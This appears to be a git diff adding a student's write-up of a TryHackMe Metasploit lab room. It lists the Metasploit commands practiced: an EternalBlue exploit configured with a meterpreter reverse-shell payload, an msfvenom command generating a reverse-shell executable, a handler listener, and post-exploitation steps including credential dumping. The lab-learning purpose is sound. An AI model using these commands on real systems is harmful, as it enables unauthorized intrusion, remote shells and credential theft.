@@ -1,0 +1,73 @@
+ Metasploit — TryHackMe
+
+Date Completed: 2025-10-20  
+Difficulty: Medium  
+Platform: [TryHackMe](https://tryhackme.com/room/metasploitintro?sharerId=6883d6a80aba1c8c9c8f670b)
+
+
+Overview
+
+This room focused on practical usage of the Metasploit Framework: choosing exploit modules, configuring payloads, setting up listeners/handlers, and performing post-exploitation actions using Meterpreter. It covers both offensive workflow and safe lab procedures for learning exploit chains.
+
+
+Key Topics Covered
+
+Metasploit architecture: msfconsole, msfvenom, modules (exploit, auxiliary, post)  
+Scanning & vulnerability mapping integration (Nmap → module selection)  
+Payload creation with `msfvenom` (stagers vs stages)  
+Listener / handler setup (`multi/handler`) and session management  
+Meterpreter basics: `sysinfo`, `getuid`, `ps`, `shell`, `download`, `upload`, `migrate`  
+Post-exploitation essentials: gathering credentials, persistence (lab-only), and cleanup
+
+
+ Commands & Workflow Practiced
+
+- Start Metasploit console:
+msfconsole
+- Use an exploit module:
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 10.10.10.20
+set LHOST <your-IP>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LPORT 4444
+exploit
+
+- Create payload with msfvenom:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-IP> LPORT=4444 -f exe -o payload.exe
+
+- Start a handler (if not using `exploit`’s auto-handler)
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <your-IP>
+set LPORT 4444
+run
+
+- Meterpreter basics (after session opens):
+sysinfo
+getuid
+ps
+shell # drop to regular shell if needed
+download C:\Users\victim\Desktop\user.txt
+upload ./local-tool.exe C:\Temp\tool.exe
+migrate <pid>
+
+
+Note: Replace `<your-IP>` and target IPs with your lab values. Never use these tools outside authorized labs.
+
+
+ Post-exploitation notes
+
+Always confirm session stability before running post-exploit modules.  
+Use `hashdump` or `creds_all` (where allowed in lab) to enumerate stored credentials.  
+When testing persistence techniques, only use them in the lab and clean up afterward.
+
+
+
+Remediation / Lessons learned
+
+Keep systems patched (many Metasploit exploits target known CVEs).  
+Limit network exposure and unnecessary services.  
+Use EDR/IDS to detect abnormal connections and behavior (reverse shells, service restarts).  
+Practice responsible disclosure and only test in authorized environments.
+
